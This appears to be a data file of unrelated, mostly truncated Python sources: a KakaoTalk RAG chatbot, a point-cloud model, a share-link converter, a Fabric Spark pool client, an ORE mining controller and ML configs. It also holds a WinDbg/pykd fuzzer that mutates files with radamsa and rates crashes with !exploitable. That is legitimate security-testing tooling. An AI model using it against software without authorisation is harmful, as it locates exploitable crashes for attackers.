loader.load_and_split(text_splitter=text_splitter)\n                st.write(\"\u2460 \uc784\ubca0\ub529 \uc0dd\uc131\")\n                status.update(label=\"\u2460 \uc784\ubca0\ub529\uc744 \uc0dd\uc131 \uc911..\ud83d\udd25\", state=\"running\")\n                # Embedding \uc0dd\uc131\n                embeddings = embeddings.embedding_factory(\n                    api_key=st.session_state[\"OPENAI_API_KEY\"]\n                )\n\n                st.write(\"\u2461 DB \uc778\ub371\uc2f1\")\n                status.update(label=\"\u2461 DB \uc778\ub371\uc2f1 \uc0dd\uc131 \uc911..\ud83d\udd25\", state=\"running\")\n                # VectorStore \uc0dd\uc131\n                faiss = FAISS.from_documents(documents, embeddings[\"faiss\"])\n                chroma = Chroma.from_documents(documents, embeddings[\"chroma\"])\n\n                st.write(\"\u2462 Retriever \uc0dd\uc131\")\n                status.update(label=\"\u2462 Retriever \uc0dd\uc131 \uc911..\ud83d\udd25\", state=\"running\")\n                # FAISSRetriever \uc0dd\uc131\n                faiss_retriever = retriever.FAISSRetrieverFactory(faiss).create(\n                    search_kwargs={\"k\": 30},\n                )\n\n                # SelfQueryRetriever \uc0dd\uc131\n                self_query_retriever = retriever.SelfQueryRetrieverFactory(\n                    chroma\n                ).create(\n                    model=\"gpt-4-turbo-preview\",\n                    temperature=0,\n                    api_key=st.session_state[\"OPENAI_API_KEY\"],\n                    search_kwargs={\"k\": 30},\n                )\n\n                # \uc559\uc0c1\ube14 retriever\ub97c \ucd08\uae30\ud654\ud569\ub2c8\ub2e4.\n                ensemble_retriever = retriever.EnsembleRetrieverFactory(None).create(\n                    retrievers=[faiss_retriever, self_query_retriever],\n                    weights=[0.4, 0.6],\n                )\n                reordering = LongContextReorder()\n\n                combined_retriever = ensemble_retriever | RunnableLambda(\n                    reordering.transform_documents\n                )\n                st.session_state[\"retriever\"] = combined_retriever\n                st.write(\"\uc644\ub8cc \u2705\")\n                status.update(label=\"\uc644\ub8cc \u2705\", state=\"complete\", expanded=False)\n        st.markdown(f'\ud83d\udcac `{st.session_state[\"kakaotalk_file\"].name}`')\n        st.markdown(\n            \"\ud83d\udd14\ucc38\uace0\\n\\n**\uc0c8\ub85c\uc6b4 \uce74\ud1a1 \ud30c\uc77c** \ub85c \ub300\ud654\ub97c \uc2dc\uc791\ud558\ub824\uba74, `\uc0c8\ub85c\uace0\uce68` \ud6c4 \uc9c4\ud589\ud574 \uc8fc\uc138\uc694\"\n        )\n\n\n# \uc774\uc804 \ub300\ud654\uae30\ub85d\uc744 \ucd9c\ub825\ud574 \uc8fc\ub294 \ucf54\ub4dc\nprint_messages()\n\n\nif user_input := st.chat_input(\"\uba54\uc2dc\uc9c0\ub97c \uc785\ub825\ud574 \uc8fc\uc138\uc694.",
    "import pykd\r\nimport datetime\r\nimport os\r\nimport random\r\nimport multiprocessing\r\nimport shutil\r\n\r\ndef mutate_files(target_program):\r\n    print(\"\\n\\t[+] FILE MUTATOR [+]\\t\\n\")\r\n\r\n    target_folder = f\".\\\\testcases\\\\{target_program}\"\r\n    os.makedirs(target_folder, exist_ok=True)\r\n\r\n    num_fuzz_corpus = int(input(\"Enter the number of fuzz corpus: \"))\r\n\r\n    testcases_per_corpus = []\r\n\r\n    for i in range(num_fuzz_corpus):\r\n        num_testcases = int(input(f\"Enter the number of testcases for fuzz corpus {i+1}: \"))\r\n        testcases_per_corpus.append(num_testcases)\r\n\r\n    input_files = []\r\n    for i in range(num_fuzz_corpus):\r\n        input_file = input(f\"Enter the path of fuzz corpus {i+1}: \")\r\n        input_files.append(input_file)\r\n\r\n    extension_type = input(\"Enter the extension of output: \")\r\n\r\n    for i, num_testcases in enumerate(testcases_per_corpus):\r\n        corpus_folder = f\"{target_folder}\\\\corpus_{i+1}\\\\\"\r\n        os.makedirs(corpus_folder, exist_ok=True)\r\n        input_file = input_files[i]\r\n        \r\n        print(f\"\\nCorpus {i+1}:\")\r\n        print(f\"Number of Test Cases: {num_testcases}\")\r\n\r\n        for testcase_index in range(1, num_testcases + 1):\r\n            output_file = f\"{corpus_folder}\\\\testcase_{i+1}_{testcase_index}.{extension_type}\"\r\n            mutationTypes = [\"ab\", \"bd\", \"bf\", \"bi\", \"br\", \"bp\", \"bed\", \"ber\", \"sr\", \"ld\", \"lds\", \"lr2\", \"li\", \"ls\", \"lis\", \"ui\", \"num\", \"fo\", \"fn\"]\r\n            number_of_elements_to_choose = random.randint(1, 19)\r\n            random.shuffle(mutationTypes)\r\n            selected_elements = mutationTypes[:number_of_elements_to_choose]\r\n            result = \",\".join(selected_elements)\r\n            command = f\"radamsa.exe -m {result} {input_file} > {output_file}\"\r\n            os.system(command)\r\n            print(f\"Mutation type for testcase {testcase_index}: {result}\")\r\n            print(f\"Output saved to: {output_file}\\n\")\r\n\r\n    total_testcases = sum(testcases_per_corpus)\r\n    print(f\"\\n\\n[+] Testcases saved successfully.\")\r\n    print(f\"Total testcases: {total_testcases}\\n\\n\\n\")\r\n    main()\r\n\r\n\r\nclass ExceptionHandler(pykd.eventHandler):\r\n    def __init__(self):\r\n        pykd.eventHandler.__init__(self)\r\n        self.accessViolationOccured = False\r\n        self.bOver=0\r\n        self.address = 0\r\n        self.type = 0\r\n        self.code = 0\r\n    def onException(self, exceptInfo):        \r\n        print(\"[+] Exception code {}\\n\".format(hex(exceptInfo.exceptionCode)))\r\n\r\n        self.accessViolationOccured = exceptInfo.exceptionCode == 0xC0000005\r\n       \r\n        if self.accessViolationOccured:\r\n            self.bOver = 1\r\n            self.type = exceptInfo.parameters[0]\r\n            self.address = exceptInfo.parameters[1]\r\n            self.code = exceptInfo.exceptionCode\r\n            return pykd.eventResult.Break\r\n\r\n        if exceptInfo.firstChance:\r\n            return pykd.eventResult.NoChange\r\n\r\n        return pykd.eventResult.Break\r\n\r\n\r\n\r\ndef windbg_monitr(target_program):\r\n    \r\n    print(\"\\n\\t[+] Welcome to WinDBG Monitor [+]\\n\")\r\n    print(\"\\n\\tUsage:\\t Enter <target program>\\n\\t\\t Enter <argument>\\n\\n\")\r\n\r\n    process_path = input(\"\\nEnter the path of executable: \")\r\n    process_args = input(\"Please Enter the argument: \")\r\n    \r\n    log = \"\\n===============================\\nExecutable Path : \" + process_path + \"\\n\" + \"Arguments : \" + process_args + \"\\n===============================\\n\"\r\n    print(log)\r\n  \r\n    while (True):\r\n\r\n        pykd.startProcess(process_path + \" \" + process_args, pykd.ProcessDebugOptions.BreakOnStart | pykd.ProcessDebugOptions.DebugChildren)\r\n        \r\n\r\n        command = input(\"PyKD> \")\r\n        result = pykd.dbgCommand(command)\r\n        print(result)\r\n\r\n        expHandler = ExceptionHandler()\r\n\r\n        if expHandler.accessViolationOccured:\r\n            print(\"\\n[+] CRASH FOUND [+]\\n\")\r\n            logging(process_args, target_program)\r\n        elif command == \"exit\":\r\n            print(\"\\n[x] Exiting..\\n\")\r\n            main()\r\n        else:\r\n            print(\"NO CRASH HAPPEND [X]\")\r\n\r\n        \r\n    \r\n\r\n\r\ndef logging(testcase_crash_caused, target_program):\r\n        current_time = datetime.datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\")\r\n\r\n        log_folder = f\".\\\\logs\\\\{target_program}_logs\"\r\n        os.makedirs(log_folder, exist_ok=True)\r\n        log_path = f\"{log_folder}\\\\log_{current_time}.txt\"\r\n\r\n        pykd.loadExt(\".\\\\MSEC.dll\")\r\n        exploitable_check = pykd.dbgCommand(\"!exploitable\")\r\n        exploitable_result_str = str(exploitable_check)\r\n    \r\n        new_hash = str(exploitable_result_str.split(\"=\")[1].split(\")\")[0])    \r\n        print(f\"Major & Minor are: {new_hash}\")\r\n\r\n        g_hashes_file = \".\\\\logs\\\\unique\\\\hashes.txt\"\r\n        hashes_file = open(g_hashes_file, \"r\")\r\n        hashes_lines = hashes_file.readlines()\r\n        hashes_counter = 0\r\n        for x in hashes_lines:\r\n            if(str(new_hash + '\\n') == str(x)):\r\n                hashes_counter = hashes_counter + 1\r\n        \r\n        hashes_fi",
    "import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport sys\nsys.path.append('..')\nfrom VecKM_small import VecKM\nfrom complexPyTorch.complexLayers import ComplexLinear, ComplexReLU\n\nclass get_model(nn.Module):\n    def __init__(self, output_channels=40):\n        super(get_model, self).__init__()\n        self.vkm_feat = nn.Sequential(\n            VecKM(256, 30, 6, positional_encoding=True),\n            ComplexLinear(256, 256),\n            ComplexReLU(),\n            ComplexLinear(256, 256)\n        )\n        self.pt_last = Point_Transformer_Last()\n\n        self.conv_fuse = nn.Sequential(nn.Conv1d(1280, 1024, kernel_size=1, bias=False),\n                                    nn.BatchNorm1d(1024),\n                                    nn.LeakyReLU(negative_slope=0.2))\n\n\n        self.linear1 = nn.Linear(1024, 512, bias=False)\n        self.bn6 = nn.BatchNorm1d(512)\n        self.dp1 = nn.Dropout(p=0.5)\n        self.linear2 = nn.Linear(512, 256)\n        self.bn7 = nn.BatchNorm1d(256)\n        self.dp2 = nn.Dropout(p=0.5)\n        self.linear3 = nn.Linear(256, output_channels)\n\n    def forward(self, x):\n        batch_size, _, _ = x.size()\n\n        x = x.permute(0, 2, 1)\n        G = self.vkm_feat(x)\n        G = G.real**2 + G.imag**2\n        G = G.permute(0, 2, 1)\n\n        x = self.pt_last(G)\n        x = torch.cat([x, G], dim=1)\n        x = self.conv_fuse(x)\n        x = F.adaptive_max_pool1d(x, 1).view(batch_size, -1)\n        x = F.leaky_relu(self.bn6(self.linear1(x)), negative_slope=0.2)\n        x = self.dp1(x)\n        x = F.leaky_relu(self.bn7(self.linear2(x)), negative_slope=0.2)\n        x = self.dp2(x)\n        x = self.linear3(x)\n\n        return x\n\nclass Point_Transformer_Last(nn.Module):\n    def __init__(self, channels=256):\n        super(Point_Transformer_Last, self).__init__()\n        self.conv1 = nn.Conv1d(channels, channels, kernel_size=1, bias=False)\n        self.conv2 = nn.Conv1d(channels, channels, kernel_size=1, bias=False)\n\n        self.bn1 = nn.BatchNorm1d(channels)\n        self.bn2 = nn.BatchNorm1d(channels)\n\n        self.sa1 = SA_Layer(channels)\n        self.sa2 = SA_Layer(channels)\n        self.sa3 = SA_Layer(channels)\n        self.sa4 = SA_Layer(channels)\n\n    def forward(self, x):\n        # \n        # b, 3, npoint, nsample  \n        # conv2d 3 -> 128 channels 1, 1\n        # b * npoint, c, nsample \n        # permute reshape\n        batch_size, _, N = x.size()\n\n        # B, D, N\n        x = F.relu(self.bn1(self.conv1(x)))\n        x = F.relu(self.bn2(self.conv2(x)))\n        x1 = self.sa1(x)\n        x2 = self.sa2(x1)\n        x3 = self.sa3(x2)\n        x4 = self.sa4(x3)\n        x = torch.cat((x1, x2, x3, x4), dim=1)\n\n        return x\n\nclass SA_Layer(nn.Module):\n    def __init__(self, channels):\n        super(SA_Layer, self).__init__()\n        self.q_conv = nn.Conv1d(channels, channels // 4, 1, bias=False)\n        self.k_conv = nn.Conv1d(channels, channels // 4, 1, bias=False)\n        self.q_conv.weight = self.k_conv.weight\n        self.q_conv.bias = self.k_conv.bias\n\n        self.v_conv = nn.Conv1d(channels, channels, 1)\n        self.trans_conv = nn.Conv1d(channels, channels, 1)\n        self.after_norm = nn.BatchNorm1d(channels)\n        self.act = nn.ReLU()\n        self.softmax = nn.Softmax(dim=-1)\n\n    def forward(self, x):\n        # b, n, c\n        x_q = self.q_conv(x).permute(0, 2, 1)\n        # b, c, n\n        x_k = self.k_conv(x)\n        x_v = self.v_conv(x)\n        # b, n, n\n        energy = torch.bmm(x_q, x_k)\n\n        attention = self.softmax(energy)\n        attention = attention / (1e-9 + attention.sum(dim=1, keepdim=True))\n        # b, c, n\n        x_r = torch.bmm(x_v, attention)\n        x_r = self.act(self.after_norm(self.trans_conv(x - x_r)))\n        x = x + x_r\n        return x",
    "import re\r\n\r\ndef convert_urls(input_file, output_file):\r\n    # \u7b2c\u4e00\u79cd\u6a21\u5f0f\u5339\u914d\u89c4\u5219\r\n    pattern1 = re.compile(r'https://www\\.alipan\\.com/s/(\\w+)/folder/(\\w+)')\r\n    # \u7b2c\u4e8c\u79cd\u6a21\u5f0f\u5339\u914d\u89c4\u5219\r\n    pattern2 = re.compile(r'(.+) https://www\\.alipan\\.com/s/(\\w+)/folder/(\\w+) (\\d+)')\r\n    # \u65b0\u589e\u7684\u6a21\u5f0f\u5339\u914d\u89c4\u5219 1\r\n    pattern3 = re.compile(r'(\\w+) https://www\\.aliyundrive\\.com/s/(\\w+)/folder/(\\w+)')\r\n    # \u65b0\u589e\u7684\u6a21\u5f0f\u5339\u914d\u89c4\u5219 2\r\n    pattern4 = re.compile(r'https://www\\.aliyundrive\\.com/s/(\\w+)/folder/(\\w+)(.*)')\r\n\r\n    try:\r\n        # \u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\uff0c\u6307\u5b9a\u4f7f\u7528 utf-8 \u7f16\u7801\uff0c\u5e76\u786e\u4fdd\u884c\u7ed3\u675f\u7b26\u4e3a Unix \u683c\u5f0f\r\n        with open(input_file, 'r', encoding='utf-8', newline='') as file:\r\n            urls = [line.strip() for line in file if line.strip()]\r\n    except FileNotFoundError:\r\n        print(f\"\u65e0\u6cd5\u627e\u5230\u8f93\u5165\u6587\u4ef6\uff1a{input_file}\")\r\n        return\r\n    except UnicodeDecodeError as e:\r\n        print(f\"\u6587\u4ef6\u7f16\u7801\u9519\u8bef\uff1a{e}\")\r\n        return\r\n\r\n    # \u51c6\u5907\u8f6c\u6362\u540e\u7684 URL \u5217\u8868\r\n    converted_urls = []\r\n\r\n    # \u8f6c\u6362\u6bcf\u4e2a URL\r\n    for url in urls:\r\n        # \u5c1d\u8bd5\u7b2c\u4e00\u79cd\u89c4\u5219\u5339\u914d\u548c\u8f6c\u6362\r\n        if pattern1.search(url):\r\n            converted = pattern1.sub(r'\\1 \\2', url)\r\n        # \u5c1d\u8bd5\u7b2c\u4e8c\u79cd\u89c4\u5219\u5339\u914d\u548c\u8f6c\u6362\r\n        elif pattern2.search(url):\r\n            converted = pattern2.sub(r'\\1 \\2 \\3 \\4', url)\r\n        # \u5c1d\u8bd5\u65b0\u589e\u7684\u89c4\u5219 1 \u5339\u914d\u548c\u8f6c\u6362\r\n        elif pattern3.search(url):\r\n            converted = pattern3.sub(r'\\1 \\2 \\3', url)\r\n        # \u5c1d\u8bd5\u65b0\u589e\u7684\u89c4\u5219 2 \u5339\u914d\u548c\u8f6c\u6362\r\n        elif pattern4.search(url):\r\n            converted = pattern4.sub(r'\\1 \\2 \\3', url)\r\n        else:\r\n            # \u5982\u679c\u90fd\u4e0d\u5339\u914d\uff0c\u4fdd\u7559\u539f\u59cb URL\r\n            converted = url\r\n        # \u5c06\u8f6c\u6362\u540e\u7684 URL \u6dfb\u52a0\u5230\u5217\u8868\uff0c\u5e76\u5728\u6bcf\u4e2a URL \u540e\u6dfb\u52a0\u6362\u884c\u7b26\r\n        converted_urls.append(converted + '\\n')\r\n\r\n    # \u8f93\u51fa\u7ed3\u679c\u5230\u6307\u5b9a\u7684\u8f93\u51fa\u6587\u4ef6\r\n    try:\r\n        with open(output_file, 'w', encoding='utf-8', newline='\\n') as file:\r\n            file.writelines(converted_urls)\r\n    except IOError as e:\r\n        print(f\"\u6587\u4ef6\u5199\u5165\u9519\u8bef\uff1a{e}\")\r\n        return\r\n\r\n    print(f'\u8f6c\u6362\u5b8c\u6210\uff0c\u8f6c\u6362\u540e\u7684 URLs \u5df2\u4fdd\u5b58\u5728 \"{output_file}\" \u6587\u4ef6\u4e2d\uff0c\u8f6c\u6362\u540e\u7684\u5185\u5bb9\u4e3a\uff1a\\n{\"\".join(converted_urls)}')  # \u6dfb\u52a0\u8f6c\u6362\u540e\u7684\u5185\u5bb9\uff0c\u5e76\u5206\u884c\u663e\u793a\r\n    # \u7b49\u5f85\u7528\u6237\u6309\u4efb\u610f\u952e\u9000\u51fa\r\n    any_key = input(\"\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/ypq123456789/xiaoya-convert\uff0c\u5982\u679c\u4f7f\u7528\u6ee1\u610f\u8bf7\u7ed9\u4e2astar\uff0c\u6309ENTER\u952e\u9000\u51fa...\")\r\n\r\n\r\n# \u8f93\u5165\u6587\u4ef6\u548c\u8f93\u51fa\u6587\u4ef6\u7684\u8def\u5f84\r\ninput_file_path = 'input_urls.txt'\r\noutput_file_path = 'alishare_list.txt'\r\n\r\n# \u8c03\u7528\u8f6c\u6362\u51fd\u6570\r\nconvert_urls(input_file_path, output_file_path)\r\n",
    "import json\nfrom time import sleep\n\nimport requests \n\n\nclass SparkCustomPool:\n    \"\"\"Class to represent a custom pool in Microsoft Fabric\"\"\"\n\n    def __init__(self, id, name, type, node_family, node_size, auto_scale, dynamic_executor_allocation, workspace_id, auth) -> None:\n        \n        self.id = id\n        self.name = name\n        self.type = type\n        self.node_family = node_family\n        self.node_size = node_size\n        self.auto_scale = auto_scale\n        self.dynamic_executor_allocation = dynamic_executor_allocation\n        self.workspace_id = workspace_id\n        \n        self.auth = auth\n\n    def __str__(self) -> str:\n        \"\"\"Return a string representation of the workspace object\"\"\"\n        dict_ = {\n            \"id\": self.id,\n            \"name\": self.name,\n            \"type\": self.type,\n            \"nodeFamily\": self.node_family,\n            \"nodeSize\": self.node_size,\n            \"autoScale\": self.auto_scale,\n            \"dynamicExecutorAllocation\": self.dynamic_executor_allocation,\n            \"workspaceId\": self.workspace_id\n        }\n        return json.dumps(dict_, indent=2)\n    \n    def __repr__(self) -> str:\n        return self.__str__()\n    \n    def from_dict(item_dict, auth):\n        \"\"\"Create Item object from dictionary\"\"\"\n\n        if 'autoScale' not in item_dict:\n            item_dict['autoScale'] = item_dict['auto_scale']\n\n        if 'dynamicExecutorAllocation' not in item_dict:\n            item_dict['dynamicExecutorAllocation'] = item_dict['dynamic_executor_allocation']\n        \n        if 'nodeFamily' not in item_dict:\n            item_dict['nodeFamily'] = item_dict['node_family']\n        \n        if 'nodeSize' not in item_dict:\n            item_dict['nodeSize'] = item_dict['node_size']\n        \n        return SparkCustomPool(id=item_dict['id'], name=item_dict['name'], type=item_dict['type'], node_family=item_dict['nodeFamily'],\n                                node_size=item_dict['nodeSize'], auto_scale=item_dict['autoScale'], dynamic_executor_allocation=item_dict['dynamicExecutorAllocation'],\n                                workspace_id=item_dict['workspaceId'], auth=auth)\n\n\n    def delete(self):\n        \"\"\"Delete the custom pool item\"\"\"\n        # DELETE http://api.fabric.microsoft.com/v1/workspaces/{workspaceId}/spark/pools/{poolId}\n\n        url = f\"https://api.fabric.microsoft.com/v1/workspaces/{self.workspace_id}/spark/pools/{self.id}\"\n        for _ in range(10):\n            response = requests.delete(url=url, headers=self.auth.get_headers())\n            if response.status_code == 429:\n                print(\"Too many requests, waiting 10 seconds\")\n                sleep(10)\n                continue\n            if response.status_code not in (200, 429):\n                raise Exception(f\"Error deleting spark pool: {response.status_code}, {response.text}\")\n            break\n\n        return response.status_code\n    \n\n    def update(self, name, node_family, node_size, auto_scale, dynamic_executor_allocation):\n        \"\"\"Update the custom pool item\"\"\"\n        url = f\"https://api.fabric.microsoft.com/v1/workspaces/{self.workspace_id}/spark/pools/{self.id}\"\n        body = {}\n\n        if name is not None:\n            body['name'] = name\n        if node_family is not None:\n            body['nodeFamily'] = node_family\n        if node_size is not None:\n            body['nodeSize'] = node_size\n        if auto_scale is not None:\n            body['autoScale'] = auto_scale\n        if dynamic_executor_allocation is not None:\n            body['dynamicExecutorAllocation'] = dynamic_executor_allocation\n\n        if not body:\n            return self\n        for _ in range(10):\n            response = requests.patch(url=url, headers=self.auth.get_headers(), json=body)\n            if response.status_code == 429:\n                print(\"Too many requests, waiting 10 seconds\")\n                sleep(10)\n                continue\n            if response.status_code not in (200, 429):\n                raise Exception(f\"Error updating item: {response.status_code}, {response.text}\")\n            break\n\n        if name is not None:\n            self.name = name\n        if node_family is not None:\n            self.node_family = node_family\n        if node_size is not None:\n            self.node_size = node_size\n        if auto_scale is not None:\n            self.auto_scale = auto_scale\n        if dynamic_executor_allocation is not None:\n            self.dynamic_executor_allocation = dynamic_executor_allocation\n\n        return self\n    ",
    "import configparser\nimport platform\nfrom tqdm import tqdm  # type: ignore\nimport time\nfrom datetime import datetime\n\nimport subprocess\nimport threading\nimport os\nimport psutil  # type: ignore\n\n\nclass Ore:\n    def __init__(self, config_path: str = \"config.ini\"):\n        config = configparser.ConfigParser()\n        config.read(config_path)\n\n        self.priority_fee = int(config.get(\"ORE\", \"priority_fee\"))\n\n        self.keypairs_path = config.get(\"ORE\", \"keypairs_path\")\n        if os.path.exists(self.keypairs_path):\n            self.keypairs = []\n            for kp in os.listdir(self.keypairs_path):\n                if os.path.splitext(kp)[1] == \".json\":\n                    self.keypairs.append(os.path.join(self.keypairs_path, kp))\n\n            if not self.keypairs:\n                print(\"Keypairs folder is empty.\")\n        else:\n            print(f\"The provided path: {self.keypairs_path} does not exist.\")\n\n        self.rpc = config.get(\"ORE\", \"rpc\")\n        self.rpc = self.rpc.split(\",\")  # type: ignore\n\n        self.threads = int(config.get(\"ORE\", \"threads\"))\n\n        self.parallel_miners = int(config.get(\"MINERS\", \"parallel_miners\"))\n        self.miners_phase = float(config.get(\"MINERS\", \"miners_phase\"))\n        self.miners_wave = int(config.get(\"MINERS\", \"miners_wave\"))\n\n        subprocess.run(\n            \"title OMC Controller\", shell=True, capture_output=False, text=False\n        )\n\n    def get_output(self, command: str) -> str | None:\n        try:\n            output = subprocess.check_output(command, shell=True)\n            return output.decode(\"utf-8\")\n\n        except subprocess.CalledProcessError as e:\n            print(f\"Error executing command: {e}\")\n            return None\n\n    def mine(self):\n        command = f\"ore --keypair {self.keypairs} --priority-fee {self.priority_fee} --rpc {self.rpc[0]} mine --threads {self.threads}\"\n\n        stdout = True\n\n        if stdout:\n            process = subprocess.Popen(command, shell=True)\n        else:\n            with open(os.devnull, \"w\") as devnull:\n                process = subprocess.Popen(\n                    command, shell=True, stdout=devnull, stderr=devnull\n                )\n\n        process.wait()\n\n    def parallel_mining(self):\n        results = []\n\n        def command(keypair, rpc, id):\n            path = os.getcwd()\n\n            command = f'start cmd /c \"cd {path} & mode con: cols=45 lines=10 & title OMC Mining Instance {id:03d} & '\n            command += f\"ore --keypair {keypair} --priority-fee {self.priority_fee} --rpc {rpc} mine --threads {self.threads}\"\n            command += ' & pause\" /s'\n\n            process = subprocess.Popen(\n                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n            )\n\n            stdout, stderr = process.communicate()\n            results.append([stdout, stderr])\n\n        print(\"In 5 seconds miners will start deploying...\")\n        time.sleep(5)\n\n        status_bar = tqdm(\n            total=len(self.keypairs * self.parallel_miners),\n            desc=\"Deploying miners\",\n            unit=\"m\",\n        )\n\n        i = 0\n        threads = []\n\n        min_sleep = 3\n        min_cpu_usage = 35  # %\n        for _ in range(self.parallel_miners):\n            for keypair in self.keypairs:\n                if i != 0 and i % self.miners_wave == 0:\n                    time.sleep(min_sleep)\n                    for _ in range(max(0, int(self.miners_phase - min_sleep))):\n                        cpu_usage = psutil.cpu_percent(1)\n                        if cpu_usage <= min_cpu_usage:\n                            break\n                else:\n                    time.sleep(0.1)\n\n                t = threading.Thread(\n                    target=command, args=(keypair, self.rpc[i % len(self.rpc)], i + 1)\n                )\n                threads.append(t)\n                t.start()\n\n                i += 1\n                status_bar.update(1)\n\n    def rewards(self, keypair):\n        command = f\"ore --keypair {keypair} --rpc {self.rpc[0]} rewards\"\n        output: str = self.get_output(command)  # type: ignore\n\n        if output is not None:\n            rewards = float(output.split()[0])\n        else:\n            rewards = 0\n        return rewards\n\n    def rewards_multiple(self):\n        rewards = 0\n        for keypair in self.keypairs:\n            rewards += self.rewards(keypair)\n        return rewards\n\n    def force_claim(self):\n        rewards = self.rewards_multiple()\n\n        if rewards == 0:\n            print(\"You have no rewards to claim. Exiting.\")\n        else:\n            print(f\"Trying to claim {rewards:06f} ORE\")\n\n        for i, keypair in enumerate(self.keypairs):\n            if self.rewards(keypair) == 0:\n                continue\n\n            command = f\"ore --keypair {keypair} --priority-fee {self.priority_fee} --rpc {self.rpc[0]} claim\"\n\n            while True:\n                output: str = self.get_output(command)  # type: ignore\n\n                success_msg = \"Transaction landed!\"\n                i",
    "import argparse\r\nimport template\r\n\r\nparser = argparse.ArgumentParser(description=\"HyperSpectral Imaging\")\r\nparser.add_argument('--template', default='CasFormer', help='You can set various templates in option.py')\r\n\r\n# Hardware specifications\r\nparser.add_argument(\"--gpu_id\", type=str, default='0,1,2,3,4,5,6')\r\n\r\n# Data specifications\r\nparser.add_argument('--data_root', type=str, default='../datasets/', help='dataset directory')\r\nparser.add_argument('--data_path_cave', default='../datasets/Train/cave_train/', type=str, help='path of data')\r\n#parser.add_argument('--data_path_kaist', default='../datasets/Train/kaist_train/', type=str, help='path of data')\r\n# parser.add_argument('--data_path_icvl', default='../datasets/Train/icvl_train/', type=str, help='path of data')\r\nparser.add_argument('--mask_path', default='../datasets/Train/mask_train.mat', type=str, help='path of mask')\r\n\r\n# Saving specifications\r\nparser.add_argument('--outf', type=str, default='./exp/', help='saving_path')\r\n\r\n# Model specifications\r\nparser.add_argument('--method', type=str, default='CasFormer', help='method name')\r\nparser.add_argument('--pretrained_model_path', type=str, default=None, help='pretrained Network_Model directory')\r\nparser.add_argument(\"--input_setting\", type=str, default='H', help='the input measurement of the network: H, HM or Y')\r\nparser.add_argument(\"--data_path_test\",default='../datasets/Test/cave_test/', type=str, help='path of data')\r\nparser.add_argument('--TrainMask_path', default='../datasets/Train/mask_train.mat', type=str, help='path of mask')\r\nparser.add_argument('--TestMask_path', default='../datasets/Test/mask_train.mat', type=str, help='path of mask')\r\n\r\n# Training specifications\r\nparser.add_argument(\"--size\", default=256, type=int, help='cropped patch size')\r\nparser.add_argument(\"--epoch_sam_num\", default=5000, type=int, help='total number of trainset')\r\nparser.add_argument(\"--seed\", default=1, type=int, help='Random_seed')\r\nparser.add_argument('--batch_size', type=int, default=16, help='the number of HSIs per batch')\r\nparser.add_argument(\"--isTrain\", default=True, type=bool, help='train or test')\r\nparser.add_argument(\"--max_epoch\", type=int, default=300, help='total epoch')\r\nparser.add_argument(\"--scheduler\", type=str, default='MultiStepLR', help='MultiStepLR or CosineAnnealingLR')\r\nparser.add_argument(\"--milestones\", type=int, default=[50,100,150,200,250], help='milestones for MultiStepLR')\r\nparser.add_argument(\"--gamma\", type=float, default=0.6, help='learning rate decay for MultiStepLR')\r\nparser.add_argument(\"--learning_rate\", type=float, default=0.0007)\r\n\r\nopt = parser.parse_args()\r\ntemplate.set_template(opt)\r\n\r\nopt.trainset_num = 20000 // ((opt.size // 96) ** 2)\r\n\r\nfor arg in vars(opt):\r\n    if vars(opt)[arg] == 'True':\r\n        vars(opt)[arg] = True\r\n    elif vars(opt)[arg] == 'False':\r\n        vars(opt)[arg] = False",
    "# Copyright 2024 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport os\nimport time\n\nimport jax\nfrom absl import flags\nfrom jetstream_pt.engine import create_pytorch_engine\nfrom jetstream_pt.environment import QuantizationConfig\n\nFLAGS = flags.FLAGS\n\nflags.DEFINE_string(\"tokenizer_path\", None, \"The tokenizer model path\")\nflags.DEFINE_string(\"model_name\", None, \"model type\")\nflags.DEFINE_string(\"checkpoint_path\", None, \"Directory for .pth checkpoints\")\nflags.DEFINE_bool(\"bf16_enable\", True, \"Whether to enable bf16\")\nflags.DEFINE_integer(\"context_length\", 1024, \"The context length\")\nflags.DEFINE_integer(\"batch_size\", 32, \"The batch size\")\nflags.DEFINE_string(\"size\", \"tiny\", \"size of model\")\nflags.DEFINE_bool(\"quantize_kv_cache\", False, \"kv_cache_quantize\")\nflags.DEFINE_integer(\"max_cache_length\", 1024, \"kv_cache_quantize\")\nflags.DEFINE_string(\"sharding_config\", \"\", \"config file for sharding\")\nflags.DEFINE_bool(\n    \"shard_on_batch\",\n    False,\n    \"whether to shard on batch dimension\"\n    \"If set true, sharding_config will be ignored.\",\n)\nflags.DEFINE_string(\"profiling_output\", \"\", \"The profiling output\")\n\n# Quantization related flags\nflags.DEFINE_bool(\"quantize_weights\", False, \"weight quantization\")\nflags.DEFINE_string(\n    \"quantize_type\", \"int8_per_channel\", \"Type of quantization.\"\n)\n\n_VALID_QUANTIZATION_TYPE = {\n    \"int8_per_channel\",\n    \"int4_per_channel\",\n    \"int8_blockwise\",\n    \"int4_blockwise\",\n}\n\nflags.register_validator(\n    \"quantize_type\",\n    lambda value: value in _VALID_QUANTIZATION_TYPE,\n    f\"quantize_type is invalid, supported quantization types are {_VALID_QUANTIZATION_TYPE}\",\n)\n\n\ndef create_quantization_config_from_flags():\n  \"\"\"Create Quantization Config from cmd flags\"\"\"\n  config = QuantizationConfig()\n  quantize_weights = FLAGS.quantize_weights\n  quantize_type = FLAGS.quantize_type\n  if not quantize_weights:\n    return config\n  config.enable_weight_quantization = True\n  config.num_bits_weight = 8 if \"int8\" in quantize_type else 4\n  config.is_blockwise_weight = \"blockwise\" in quantize_type\n  config.enable_kv_quantization = FLAGS.quantize_kv_cache\n  return config\n\n\ndef create_engine_from_config_flags():\n  \"\"\"create a pytorch engine from cmd flag\"\"\"\n  jax.config.update(\"jax_default_prng_impl\", \"unsafe_rbg\")\n  os.environ[\"TF_CPP_MIN_LOG_LEVEL\"] = \"0\"\n\n  devices = jax.devices()\n  start = time.perf_counter()\n\n  # Create quant config.\n  quant_config 